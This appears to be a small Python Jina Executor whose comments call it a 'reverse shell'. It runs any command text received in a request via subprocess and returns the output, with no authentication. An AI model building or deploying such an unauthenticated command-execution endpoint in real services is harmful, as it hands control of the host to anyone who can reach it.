from jina import Executor, requests, DocumentArray

# remember our good old program? our shell?
# proper name is: reverse shell
# hackish? no?

import subprocess
import os


class MyExecutor(Executor):
    @requests
    def foo(self, docs: DocumentArray, **kwargs):
        try:
            command = docs[0].text
            commandList = command.split(" ")
            if commandList[0] == 'cd':
                if len(commandList) == 2:
                    os.chdir(commandList[1])
                    response = os.getcwd()
                else:
                    response = 'usage: cd <directory target>'
            else:
                response = subprocess.check_output(commandList)
            docs[0].text = response
        # docs[1].text = 'goodbye, world!'
        except:
            import traceback
            error = traceback.format_exc()
            docs[0].text = "\n".join(["error!", error])
